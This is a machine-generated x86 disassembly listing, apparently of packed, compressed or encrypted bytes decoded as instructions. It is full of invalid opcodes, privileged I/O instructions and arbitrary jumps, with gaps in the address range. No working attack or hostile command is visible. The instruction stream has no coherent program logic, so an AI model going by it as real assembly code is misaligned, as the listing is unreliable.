  424abc:	sub    BYTE PTR [edi+ebp*1],dh
  424abf:	clc    
  424ac0:	push   edi
  424ac1:	call   0x7f4f289
  424ac6:	sbb    BYTE PTR [eax+0x262afe3c],dl
  424acc:	mov    edi,0x7885b087
  424ad1:	hlt    
  424ad2:	loopne 0x424a99
  424ad4:	mov    ds:0x31303427,eax
  424ad9:	sbb    al,0xf4
  424adb:	push   ebx
  424adc:	lahf   
  424add:	out    dx,al
  424ade:	stos   BYTE PTR es:[edi],al
  424adf:	push   esp
  424ae0:	stos   BYTE PTR es:[edi],al
  424ae1:	bound  ebp,QWORD PTR [esi+ebp*1+0x21d3e6a0]
  424ae8:	jge    0x424b26
  424aea:	xchg   ebx,eax
  424aeb:	mov    sp,0xf3
  424aef:	lea    ebx,[ebp-0x418ec02e]
  424af5:	sub    al,0x8f
  424af7:	mov    es:0xc2b2fdbb,al
  424afd:	mov    bh,BYTE PTR [ebx]
  424aff:	(bad)  
  424b00:	mov    WORD PTR [ebx+ecx*2-0x79],?
  424b04:	cmp    edx,DWORD PTR [edx-0x67]
  424b07:	loop   0x424ae3
  424b09:	dec    ebp
  424b0a:	(bad)  
  424b0b:	mov    eax,0x4730574e
  424b10:	xor    DWORD PTR [ebx],ebp
  424b12:	and    eax,0x8157bffa
  424b18:	adc    bl,BYTE PTR [eax-0x1d9e56a1]
  424b1e:	aad    0x64
  424b20:	int    0x23
  424b22:	imul   esi,DWORD PTR [edi],0xffffffd8
  424b25:	mov    eax,DWORD PTR [ebx+esi*1]
  424b28:	(bad)  
  424b29:	pushf  
  424b2a:	ds jmp 0xed8bdf5d
  424b30:	cmp    esi,DWORD PTR [ecx]
  424b32:	pop    esp
  424b33:	jno    0x424ae1
  424b35:	int3   
  424b36:	clc    
  424b37:	push   esi
  424b38:	pop    esp
  424b39:	nop
  424b3a:	sbb    eax,0x4cd1a351
  424b3f:	popf   
  424b40:	inc    BYTE PTR [esi+0x0]
	...
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x7b9f881]
  424bc1:	and    edx,DWORD PTR [eax]
  424bc3:	int    0xf2
  424bc5:	xchg   DWORD PTR [ecx],eax
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [esi],dh
  424bcd:	mov    fs,edx
  424bcf:	mov    ah,0x24
  424bd1:	imul   esp,ebp,0x6
  424bd4:	call   0x7cb9376e
  424bd9:	ret    
  424bda:	cld    
  424bdb:	xor    al,0x19
  424bdd:	jecxz  0x424baa
  424bdf:	pop    esp
  424be0:	inc    ebp
  424be1:	cmp    ebx,0xffffffd9
  424be4:	imul   BYTE PTR [ebp+0x43]
  424be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424be8:	pop    eax
  424bea:	xchg   ecx,eax
  424beb:	pop    ebp
  424bec:	xor    cl,BYTE PTR [ebx-0x74d0bbc]
  424bf2:	sub    al,0x9b
  424bf4:	mov    eax,ds:0x2918cf12
  424bf9:	mov    edi,0xd93b151e
  424bfe:	mov    cl,0x47
  424c00:	and    bh,BYTE PTR [esi+esi*2-0x5b]
  424c04:	aam    0xc9
  424c06:	xchg   edi,eax
  424c07:	mov    dl,0x70
  424c09:	in     al,dx
  424c0a:	test   BYTE PTR [ebp+0x7e],0xe0
  424c0e:	ds ins DWORD PTR es:[edi],dx
  424c10:	sub    eax,0xa8f57be8
  424c15:	sti    
  424c16:	xor    eax,0x8713ae83
  424c1b:	mov    esp,0xeb45de63
  424c20:	int3   
  424c21:	aam    0x79
  424c23:	sbb    dh,bh
  424c25:	jo     0x424c76
  424c27:	stc    
  424c28:	or     ebx,DWORD PTR [edx+0x2e8a367a]
  424c2e:	and    eax,0x1fcd1e90
  424c33:	lods   al,BYTE PTR ds:[esi]
  424c34:	inc    esp
  424c35:	add    eax,0x94566c19
  424c3a:	jae    0x424bbd
  424c3c:	mov    ds:0x8200b3f,al
  424c41:	fnsetpm(287 only) 
  424c43:	pop    ss
  424c44:	outs   dx,BYTE PTR ds:[esi]
  424c45:	mov    ah,0x23
  424c47:	rcl    DWORD PTR [edx+0x61],cl
  424c4a:	sub    eax,0x4cfec866
  424c4f:	mov    gs,WORD PTR [ebp+0x229d2e75]
  424c55:	das    
  424c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c57:	mov    esi,0xe33d63e2
  424c5c:	(bad)  
  424c5e:	mov    ds:0x69b966fa,eax
  424c63:	inc    ecx
  424c64:	fidivr DWORD PTR [ebx-0x10]
  424c67:	sbb    eax,0xd8e4c945
  424c6c:	into   
  424c6d:	push   eax
  424c6e:	call   0xef64:0x49ea9df1
  424c75:	aaa    
  424c76:	add    bl,BYTE PTR [ebp+0x6b]
  424c79:	pop    ebx
  424c7a:	inc    ecx
  424c7b:	test   dl,dl
  424c7d:	pop    esi
  424c7e:	xchg   BYTE PTR [eax+eax*4+0x53],cl
  424c82:	fiadd  DWORD PTR [esi+0x679a3be8]
  424c88:	dec    esi
  424c89:	mov    esi,0x677af07c
  424c8e:	jns    0x424cc8
  424c90:	dec    esi
  424c91:	push   edi
  424c92:	dec    ebx
  424c93:	clc    
  424c94:	mov    al,0x1e
  424c96:	mov    al,0x8e
  424c98:	out    dx,al
  424c99:	mov    eax,0x5f8a9bda
  424c9e:	aad    0x3a
  424ca0:	ror    al,cl
  424ca2:	jnp    0x424cc7
  424ca4:	shl    DWORD PTR [eax],0xe1
  424ca7:	(bad)  
  424ca8:	call   0x1d7ab0da
  424cad:	cs aas 
  424caf:	xor    bh,dh
  424cb1:	sbb    bh,ah
  424cb3:	mov    ch,BYTE PTR [eax]
  424cb5:	bt     DWORD PTR [edx+0x188305d2],edi
  424cbc:	and    bh,BYTE PTR [ecx]
  424cbe:	mov    al,0xe0
  424cc0:	jb     0x424c98
	...
  424d32:	add    BYTE PTR [eax],al
  424d34:	(bad)  
  424d35:	test   BYTE PTR [edi-0x118668f7],0xff
  424d3c:	test   BYTE PTR [ecx-0x21b26b29],cl
  424d42:	mov    dl,0x24
  424d44:	call   0xf6424ed1
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR ds:0xe1145c55,bl
  424d51:	or     BYTE PTR [ebp-0x49],ch
  424d54:	bound  ebx,QWORD PTR [edi]
  424d56:	dec    esp
  424d57:	aaa    
  424d58:	retf   0xdefa
  424d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d5c:	into   
  424d5d:	xor    eax,0xc487f76d
  424d62:	dec    eax
  424d63:	(bad)  
  424d64:	out    0x62,eax
  424d66:	fist   WORD PTR [ebp+0x6e]
  424d69:	jnp    0x424d6b
  424d6b:	sub    BYTE PTR [esi+0x77],dh
  424d6e:	push   edx
  424d6f:	and    DWORD PTR [edi+0x389496b4],edx
  424d75:	sub    al,0xfb
  424d77:	out    0x41,eax
  424d79:	sub    ecx,DWORD PTR [edi+0x5e65bc24]
  424d7f:	cs pushf 
  424d81:	push   edi
  424d82:	cmp    al,0x4
  424d84:	dec    ebp
  424d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d86:	mov    bl,0x72
  424d88:	scas   al,BYTE PTR es:[edi]
  424d89:	xor    ah,BYTE PTR [esi-0x20]
  424d8c:	and    al,0x8e
  424d8e:	adc    al,0xa8
  424d90:	retf   
  424d91:	jp     0x424d63
  424d93:	icebp  
  424d94:	and    BYTE PTR [eax],dh
  424d96:	test   BYTE PTR [edx],bh
  424d98:	icebp  
  424d99:	aaa    
  424d9a:	and    dl,0xb4
  424d9d:	addr16 xchg esp,eax
  424d9f:	das    
  424da0:	es pop esi
  424da2:	test   eax,0x1d0471b1
  424da7:	inc    ecx
  424da8:	dec    ebp
  424da9:	dec    ebx
  424daa:	dec    edi
  424dac:	mov    bl,0x23
  424dae:	jecxz  0x424e15
  424db0:	pusha  
  424db1:	mov    cl,0x89
  424db3:	ss js  0x424d88
  424db6:	or     eax,0xabad0cc9
  424dbb:	pushf  
  424dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dbd:	jns    0x424e36
  424dbf:	pop    ebp
  424dc0:	dec    esi
  424dc1:	cmp    edi,ecx
  424dc3:	mov    ?,WORD PTR [eax-0x4da5b8da]
  424dc9:	xlat   BYTE PTR ds:[ebx]
  424dca:	mov    edi,0x3fe43be9
  424dcf:	add    DWORD PTR [edi],esp
  424dd1:	sub    al,0x90
  424dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dd4:	pop    ebx
  424dd5:	jl     0x424d98
  424dd7:	xor    eax,0x7c32bb53
  424ddc:	jnp    0x424dba
  424dde:	fs jl  0x424df5
  424de1:	push   0x22b04c0b
  424de6:	retf   
  424de7:	pop    esi
  424de8:	imul   ecx,DWORD PTR [edx+0x8],0xffffffa8
  424dec:	lds    eax,FWORD PTR [edi+0x5f]
  424def:	aas    
  424df0:	sbb    cl,BYTE PTR [esi]
  424df2:	xor    BYTE PTR [edi],dl
  424df4:	repnz mov edi,0x27de9de5
  424dfa:	push   ecx
  424dfb:	aam    0xeb
  424dfd:	std    
  424dfe:	xor    eax,DWORD PTR [edi+0x68]
  424e01:	mov    esp,0x380b6718
  424e06:	aaa    
  424e07:	dec    edx
  424e08:	xor    ah,BYTE PTR [eax+0x327b9d41]
  424e0e:	bound  esi,QWORD PTR [ebp-0x4b]
  424e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e12:	cmc    
  424e13:	out    dx,al
  424e14:	fs ins DWORD PTR es:[edi],dx
  424e16:	outs   dx,BYTE PTR ds:[esi]
  424e17:	cmp    bl,BYTE PTR [ecx]
  424e19:	mov    esp,0xb0f8df2e
  424e1e:	adc    DWORD PTR [edi-0x62],ebx
  424e21:	add    eax,0x27a9e718
  424e26:	sub    eax,0x991f52c7
  424e2b:	sub    ch,al
  424e2d:	or     al,ch
  424e2f:	xchg   DWORD PTR [edx+0x3d],edi
  424e32:	out    0x97,eax
  424e34:	and    BYTE PTR [eax-0x7a],ch
  424e37:	mov    gs,esi
  424e39:	lock mov ebx,0xd5776e0c
  424e3f:	adc    eax,DWORD PTR [ebx+0x2b]
	...
  424eb1:	add    BYTE PTR [eax],al
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	scas   eax,DWORD PTR es:[edi]
  424ec1:	fmul   QWORD PTR [esi]
  424ec3:	rcr    dh,cl
  424ec5:	mov    DWORD PTR [ecx],eax
  424ec7:	add    dh,dh
  424ec9:	add    BYTE PTR [eax],al
  424ecb:	add    BYTE PTR [edx],ah
  424ecd:	inc    esi
  424ece:	data16 jle 0x424ee3
  424ed1:	mov    ah,0x35
  424ed3:	push   esp
  424ed4:	nop
  424ed5:	inc    edx
  424ed6:	addr16 pop edi
  424ed8:	mov    bl,ah
  424eda:	jle    0x424ea2
  424edc:	mov    ebp,0xba1f84ac
  424ee2:	jle    0x424ee2
  424ee4:	mov    eax,ds:0xf88e6170
  424ee9:	xchg   esp,eax
  424eea:	loope  0x424ed4
  424eec:	hlt    
  424eed:	leave  
  424eee:	sar    DWORD PTR [eax+0x1f],0x8
  424ef2:	pop    ebp
  424ef3:	(bad)  
  424ef4:	sbb    BYTE PTR [esi-0x9],ch
  424ef7:	arpl   di,bx
  424ef9:	cld    
  424efa:	cmp    ebp,DWORD PTR [ebx+esi*2+0x69541744]
  424f01:	js     0x424eb8
  424f03:	loop   0x424efd
  424f05:	sbb    BYTE PTR [eax-0x4c61cdb6],al
  424f0b:	in     al,dx
  424f0c:	imul   esi,DWORD PTR [ebx+0x26],0x73
  424f10:	jnp    0x424f60
  424f12:	mov    dh,0xbb
  424f14:	sub    BYTE PTR [ebp-0x495863c3],ch
  424f1a:	out    dx,eax
  424f1b:	js     0x424f70
  424f1d:	push   edx
  424f1e:	push   ebp
  424f1f:	push   eax
  424f20:	xor    BYTE PTR [eax+0x63667999],cl
  424f26:	or     ebp,DWORD PTR ds:0xbbeb6d8f
  424f2c:	imul   edi,ebx,0x24242753
  424f32:	add    ecx,DWORD PTR [ebx+0x3df2146b]
  424f38:	(bad)  
  424f3a:	pop    ss
  424f3b:	test   eax,0x9d7f5f7d
  424f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f41:	add    ch,ah
  424f43:	daa    
  424f44:	mov    ah,0x5b
  424f46:	push   ebp
  424f47:	adc    ch,BYTE PTR [esi+0x418051c7]
  424f4d:	(bad)  
  424f4e:	int3   
  424f4f:	mov    al,0x6d
  424f51:	ja     0x424f4f
  424f53:	cmp    DWORD PTR [edi+0x18],ebp
  424f56:	mov    al,0x82
  424f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f59:	dec    esi
  424f5a:	sbb    esi,ebp
  424f5c:	fistp  DWORD PTR [ecx-0x5fbb37bd]
  424f62:	inc    ebp
  424f63:	stos   DWORD PTR es:[edi],eax
  424f64:	mov    bl,0x84
  424f66:	xor    BYTE PTR [esi+0x31bd1413],bh
  424f6c:	les    esp,FWORD PTR [ecx]
  424f6e:	int    0x64
  424f70:	bound  edi,QWORD PTR [edi+0x62]
  424f73:	and    BYTE PTR [edi+0x58],0x24
  424f77:	pop    ebx
  424f78:	retf   
  424f79:	fwait
  424f7a:	outs   dx,DWORD PTR ds:[esi]
  424f7b:	inc    edi
  424f7c:	addr16 cmp ah,cl
  424f7f:	push   ebx
  424f80:	and    al,bl
  424f82:	push   ss
  424f83:	sub    al,0x97
  424f85:	(bad)  
  424f86:	fsub   QWORD PTR [esi]
  424f88:	lock xchg edi,eax
  424f8a:	inc    edx
  424f8b:	or     ah,BYTE PTR [esi+0x61]
  424f8e:	(bad)  
  424f90:	loope  0x425009
  424f92:	ret    0x69e8
  424f95:	mov    ds:0x9d10c293,eax
  424f9a:	adc    al,0xa5
  424f9c:	jecxz  0x424f3b
  424f9e:	fisttp DWORD PTR [ebx-0x42a6b9e5]
  424fa4:	xor    bh,BYTE PTR [ecx]
  424fa6:	fadd   DWORD PTR [ebx+0x6e]
  424fa9:	lods   al,BYTE PTR ds:[esi]
  424faa:	push   edx
  424fab:	lahf   
  424fac:	aam    0x8f
  424fae:	inc    esi
  424faf:	xor    esi,0x8ed51ad4
  424fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fb6:	std    
  424fb7:	loop   0x424f50
  424fb9:	call   0x59a4c9d1
  424fbe:	jmp    0x0:0x24f1ef
	...
  425031:	add    BYTE PTR [eax],al
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	and    dl,0xbe
  425043:	xor    esp,edx
  425045:	mov    al,BYTE PTR [ecx]
  425047:	add    dh,dh
  425049:	add    BYTE PTR [eax],al
  42504b:	add    BYTE PTR [eax],dh
  42504d:	lahf   
  42504e:	in     al,0xd4
  425050:	jns    0x424ffb
  425052:	or     dl,BYTE PTR [edx-0x6a8dd086]
  425058:	popf   
  425059:	jne    0x425045
  42505b:	hlt    
  42505c:	test   al,ch
  42505e:	hlt    
  42505f:	adc    al,0x79
  425061:	jl     0x4250a3
  425063:	into   
  425064:	out    0xdb,al
  425066:	div    BYTE PTR [ebp+0x91d5e01]
  42506c:	lahf   
  42506d:	xchg   ebx,eax
  42506e:	sub    ecx,edi
  425070:	xchg   BYTE PTR [ecx-0x4bdb6e10],dl
  425076:	ins    BYTE PTR es:[edi],dx
  425077:	test   ch,bl
  425079:	adc    BYTE PTR [eax+0x5eda44c],bl
  42507f:	push   eax
  425080:	dec    ecx
  425081:	jp     0x425052
  425083:	fmul   st(7),st
  425085:	dec    esp
  425086:	fnstenv [ebx-0x79]
  425089:	out    0xa8,eax
  42508b:	xchg   DWORD PTR [ecx],edx
  42508d:	bound  edx,QWORD PTR [ecx-0x36]
  425090:	jmp    0xa:0xfce3cec0
  425097:	gs stos BYTE PTR es:[edi],al
  425099:	sti    
  42509a:	adc    eax,0x277833d6
  42509f:	loope  0x425048
  4250a1:	adc    eax,0x25605185
  4250a6:	xchg   ah,bh
  4250a8:	ror    DWORD PTR [ebx+0x4721c5ec],cl
  4250ae:	jmp    0xa01f:0xbb33e5c1
  4250b5:	wrmsr  
  4250b7:	(bad)  
  4250b8:	xchg   esi,eax
  4250b9:	and    al,0xe9
  4250bb:	and    DWORD PTR [edx+0x171116ce],esi
  4250c1:	out    0xe6,al
  4250c3:	jp     0x4250aa
  4250c5:	add    ebp,DWORD PTR [edx+0x6613c6ed]
  4250cb:	add    eax,0xa78f2cca
  4250d0:	stos   DWORD PTR es:[edi],eax
  4250d1:	lods   al,BYTE PTR ds:[esi]
  4250d2:	shl    dl,0xcf
  4250d5:	pop    esi
  4250d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250d7:	jle    0x425100
  4250d9:	push   ebp
  4250da:	iret   
  4250db:	adc    DWORD PTR [ecx],esi
  4250dd:	js     0x4250d7
  4250df:	and    al,0xe5
  4250e1:	scas   al,BYTE PTR es:[edi]
  4250e2:	mov    dh,0x61
  4250e4:	push   ecx
  4250e5:	or     BYTE PTR [edx-0x77],bl
  4250e8:	nop
  4250e9:	and    bh,BYTE PTR [edx]
  4250eb:	sub    BYTE PTR [esi+ebp*1-0x20],0xb4
  4250f0:	es ret 0x82bf
  4250f4:	cli    
  4250f5:	and    BYTE PTR [eax+0x3a],dh
  4250f8:	popa   
  4250f9:	cli    
  4250fa:	mov    ds:0xb84473b0,al
  4250ff:	(bad)  
  425100:	pop    edi
  425101:	stos   DWORD PTR es:[edi],eax
  425102:	in     al,dx
  425103:	mov    eax,ds:0x607fc62a
  425108:	icebp  
  425109:	adc    al,0x9
  42510b:	test   edi,ecx
  42510d:	aam    0xe5
  42510f:	xor    cl,bh
  425111:	xor    bl,BYTE PTR [esp+ebx*4]
  425114:	adc    ebp,DWORD PTR [ecx]
  425116:	inc    eax
  425117:	jl     0x4250d1
  425119:	sbb    al,0x76
  42511b:	fwait
  42511c:	scas   al,BYTE PTR es:[edi]
  42511d:	loop   0x425181
  42511f:	out    dx,al
  425120:	inc    ebp
  425121:	push   ss
  425122:	jmp    0x4250ad
  425124:	lods   eax,DWORD PTR ds:[esi]
  425125:	mov    ecx,0x1073a093
  42512a:	sbb    edi,DWORD PTR [eax+0x19]
  42512d:	cwde   
  42512e:	aam    0x68
  425130:	test   DWORD PTR [esi],esi
  425132:	fimul  DWORD PTR [edx+ebx*8]
  425135:	mov    esp,0xffa248b1
  42513a:	bound  bp,DWORD PTR [ecx+0x78962026]
  425141:	les    eax,FWORD PTR [eax]
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	je     0x4251d3
  4251c2:	jecxz  0x425198
  4251c4:	retf   0x18b
  4251c7:	add    dh,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [edi],ch
  4251cd:	(bad)  
  4251ce:	adc    ebx,DWORD PTR [esi-0x48cd01c9]
  4251d4:	cmp    eax,edi
  4251d6:	inc    edx
  4251d7:	jge    0x4251d6
  4251d9:	cld    
  4251da:	inc    ebp
  4251db:	inc    esi
  4251dc:	xchg   ebp,eax
  4251dd:	dec    esi
  4251de:	dec    esp
  4251df:	adc    cl,BYTE PTR [edi+esi*2+0x7cfc5dcc]
  4251e6:	pusha  
  4251e7:	xchg   esp,eax
  4251e8:	mov    edi,0x7fdc5c51
  4251ed:	loope  0x4251b1
  4251ef:	xchg   ebx,eax
  4251f0:	mov    ebp,0x6d71c568
  4251f5:	xchg   DWORD PTR [ebx],esi
  4251f7:	pop    ds
  4251f8:	cmp    esi,DWORD PTR [edx+ebp*4-0x399d7076]
  4251ff:	data16 or al,0x67
  425202:	mov    bh,0xc5
  425204:	pop    es
  425205:	ins    BYTE PTR es:[edi],dx
  425206:	ja     0x42523c
  425208:	mov    ss,WORD PTR [eax+0x21]
  42520b:	jbe    0x42524e
  42520d:	xchg   sp,ax
  42520f:	leave  
  425210:	into   
  425211:	add    edi,DWORD PTR [edx+edi*2-0x4c]
  425215:	repnz inc esp
  425217:	out    0x70,eax
  425219:	xlat   BYTE PTR ds:[ebx]
  42521a:	xor    BYTE PTR [esi],dh
  42521c:	rcl    DWORD PTR [ecx+0x47],cl
  42521f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425220:	(bad)  
  425221:	(bad)  
  425222:	jmp    0x59542fbb
  425227:	sub    DWORD PTR [edi-0x49],esi
  42522a:	lock jne 0x425239
  42522d:	ror    BYTE PTR [esi-0x4919cc94],1
  425233:	mov    al,ds:0xff31fc49
  425238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425239:	aaa    
  42523a:	jbe    0x4251d8
  42523c:	push   ds
  42523d:	mov    dh,0xd1
  42523f:	inc    ecx
  425240:	imul   ecx,DWORD PTR [eax+ebx*4-0x27],0xffffffd6
  425245:	lods   al,BYTE PTR ds:[esi]
  425246:	and    bl,BYTE PTR [esi+0x33ba162]
  42524c:	out    0x8a,eax
  42524e:	in     eax,dx
  42524f:	mov    BYTE PTR [ebp-0x575c49e3],bl
  425255:	add    DWORD PTR [eax],edi
  425257:	gs inc ebx
  425259:	shl    BYTE PTR [edx-0x1aad1569],0x18
  425260:	jmp    0x70fd:0x5236b73e
  425267:	pop    ss
  425268:	outs   dx,DWORD PTR ds:[esi]
  425269:	and    eax,0x628703b8
  42526e:	ja     0x425204
  425270:	loope  0x4252e7
  425272:	push   ebp
  425273:	inc    ecx
  425274:	push   0xffffffca
  425276:	aam    0x22
  425278:	mov    esi,0xdd9a6df1
  42527d:	push   0x4da90b7
  425282:	fwait
  425283:	xor    ecx,esi
  425285:	enter  0xeacc,0x56
  425289:	fwait
  42528a:	sub    esp,DWORD PTR [edi]
  42528c:	and    eax,0x7ef5ec76
  425291:	mov    bl,0xfe
  425293:	xchg   ebp,eax
  425294:	repz mov ch,BYTE PTR [edx-0x3c]
  425298:	lahf   
  425299:	sbb    eax,0x310b70b7
  42529e:	scas   al,BYTE PTR es:[edi]
  42529f:	xlat   BYTE PTR ds:[ebx]
  4252a0:	cmp    al,0xad
  4252a2:	sub    dh,ch
  4252a4:	dec    ebx
  4252a5:	retf   
  4252a6:	iret   
  4252a7:	adc    bl,dh
  4252a9:	push   es
  4252aa:	jp     0x4252d2
  4252ac:	add    eax,0x5c026450
  4252b1:	sub    al,0x2f
  4252b3:	outs   dx,DWORD PTR es:[esi]
  4252b5:	daa    
  4252b6:	cs xor al,0x65
  4252b9:	mov    bh,0x3d
  4252bb:	adc    esi,ebx
  4252bd:	add    bl,dh
  4252bf:	stos   DWORD PTR es:[edi],eax
  4252c0:	push   ebp
  4252c1:	and    eax,DWORD PTR [eax]
	...
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz iret 
  425341:	sub    BYTE PTR [eax+edx*2],ah
  425344:	ror    BYTE PTR [ecx+eax*1+0xf600],0x0
  42534c:	cmp    eax,0xa8111a17
  425351:	add    BYTE PTR [eax+0x40],ah
  425354:	inc    ebp
  425355:	dec    ch
  425357:	xchg   edi,eax
  425358:	das    
  425359:	shl    DWORD PTR [edx+0x1937abed],1
  42535f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425360:	and    al,0xdb
  425362:	mov    bh,0x17
  425364:	test   ah,0x5a
  425367:	stc    
  425368:	xor    BYTE PTR [ebp+0x31],dl
  42536b:	rcl    BYTE PTR [esi-0x3d],cl
  42536e:	push   eax
  42536f:	stos   BYTE PTR es:[edi],al
  425370:	fcomip st,st(6)
  425372:	psrlq  mm4,QWORD PTR [esi-0x59]
  425376:	mov    ebp,0xfa84ecdd
  42537b:	(bad)  
  42537c:	jg     0x4253cb
  42537e:	jle    0x4253ab
  425380:	cmp    bh,bh
  425382:	pop    ss
  425383:	push   cs
  425384:	and    DWORD PTR [esi],edx
  425386:	push   esp
  425387:	sar    edx,0x5e
  42538a:	sub    BYTE PTR [edi-0x3a280fe1],al
  425390:	mov    ecx,0x9ce38f7c
  425395:	pop    edi
  425396:	mov    DWORD PTR [edx],esp
  425398:	out    0x4,eax
  42539a:	(bad)  
  42539b:	xchg   ecx,eax
  42539c:	(bad)  
  42539d:	cli    
  42539e:	in     eax,dx
  42539f:	(bad)  
  4253a0:	mov    ecx,0x588be3a
  4253a5:	mov    edi,0x71005f9d
  4253aa:	addr16 inc edx
  4253ac:	sbb    ebp,esp
  4253ae:	out    0x87,al
  4253b0:	(bad)  
  4253b2:	or     edx,DWORD PTR [ebp-0x2e]
  4253b5:	lea    eax,[edx-0x1bbf560a]
  4253bb:	dec    edi
  4253bc:	jae    0x42537e
  4253be:	jne    0x42535a
  4253c0:	cwde   
  4253c1:	cmc    
  4253c2:	cmp    DWORD PTR fs:[edi+0x1b],eax
  4253c6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253c8:	xchg   ebx,eax
  4253c9:	mov    bh,0x10
  4253cb:	inc    edi
  4253cc:	cld    
  4253cd:	mov    al,ds:0xe9c8300e
  4253d2:	mov    al,ds:0xb5525ea5
  4253d7:	inc    edx
  4253d8:	fbstp  TBYTE PTR [esi]
  4253da:	lahf   
  4253db:	fwait
  4253dc:	jae    0x4253b2
  4253de:	aaa    
  4253df:	nop
  4253e0:	mov    ah,0x8
  4253e2:	cmp    ecx,DWORD PTR [eax]
  4253e4:	nop    DWORD PTR [esi+0x1c]
  4253e8:	lods   eax,DWORD PTR ds:[esi]
  4253e9:	add    DWORD PTR [edx*2-0x1fbb85c2],0xab15b7c1
  4253f4:	stos   DWORD PTR es:[edi],eax
  4253f5:	std    
  4253f6:	jno    0x425412
  4253f8:	mov    eax,0x38c66e5e
  4253fd:	je     0x42543b
  4253ff:	stos   DWORD PTR es:[edi],eax
  425400:	sbb    al,0x4f
  425402:	and    al,0xa7
  425404:	jmp    0x42538e
  425406:	inc    edx
  425407:	push   ss
  425408:	fild   QWORD PTR [ebx+edi*1]
  42540b:	adc    al,0x6a
  42540d:	mov    esi,0xbc6bb9ea
  425412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425413:	out    0x21,eax
  425415:	sub    eax,0x9dc69024
  42541a:	test   DWORD PTR [edi],edx
  42541c:	aad    0xa7
  42541e:	mov    dh,0xc1
  425420:	mov    eax,0xe258b053
  425425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425426:	stos   BYTE PTR es:[edi],al
  425427:	xor    al,0x19
  425429:	(bad)  
  42542a:	push   esp
  42542b:	add    eax,ebp
  42542d:	xor    bl,BYTE PTR [esi]
  42542f:	adc    dl,bl
  425431:	xchg   ebx,eax
  425432:	stos   DWORD PTR es:[edi],eax
  425433:	dec    ebp
  425434:	fld    QWORD PTR [edi-0x36]
  425437:	sub    DWORD PTR cs:[esi+ecx*8+0x465d0e00],edx
  42543f:	arpl   WORD PTR gs:[ebx+0x0],bx
	...
  4254b2:	add    BYTE PTR [eax],al
  4254b4:	loopne 0x425525
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	xchg   esi,eax
  4254c1:	xchg   esp,eax
  4254c2:	adc    DWORD PTR [edi-0x4a],ebx
  4254c5:	lea    eax,[ecx]
  4254c7:	add    dh,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [esi-0x573c996d],bl
  4254d1:	in     al,dx
  4254d2:	adc    ecx,DWORD PTR [edx+eax*2-0x565068fa]
  4254d9:	aam    0x45
  4254db:	ss push eax
  4254dd:	imul   edi,DWORD PTR [esi-0x78],0x3b
  4254e1:	(bad)  
  4254e2:	adc    al,0xd9
  4254e4:	aam    0x8c
  4254e6:	pop    es
  4254e7:	lock add DWORD PTR [ebx-0x4e],edi
  4254eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ec:	mov    ebp,ebp
  4254ee:	jg     0x42554e
  4254f0:	xchg   ecx,eax
  4254f1:	lea    edi,[esi-0x7d]
  4254f4:	ins    BYTE PTR es:[edi],dx
  4254f5:	outs   dx,DWORD PTR ds:[esi]
  4254f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254f7:	dec    ecx
  4254f8:	mov    WORD PTR [edx-0x508ac157],ss
  4254fe:	jp     0x425530
  425500:	pop    edx
  425501:	retf   
  425502:	fwait
  425503:	test   BYTE PTR ds:0x7e95f5d,0x6d
  42550a:	fwait
  42550b:	and    eax,0x5c4c2a72
  425510:	inc    ebx
  425511:	sbb    BYTE PTR ds:0xe54eeb8,bl
  425517:	mov    cl,0x85
  425519:	mov    esi,0x64aa149d
  42551e:	sbb    DWORD PTR [esi+0x2ca12c99],eax
  425524:	mov    ch,0x45
  425526:	or     BYTE PTR [edx],bl
  425528:	pop    ds
  425529:	loope  0x4254eb
  42552b:	push   ss
  42552c:	rcr    DWORD PTR [ebx+0x2a],cl
  42552f:	mov    eax,ds:0xbc1dbabb
  425534:	loope  0x42559e
  425536:	fld    TBYTE PTR [edx]
  425538:	mov    dh,0x5e
  42553a:	inc    esi
  42553b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
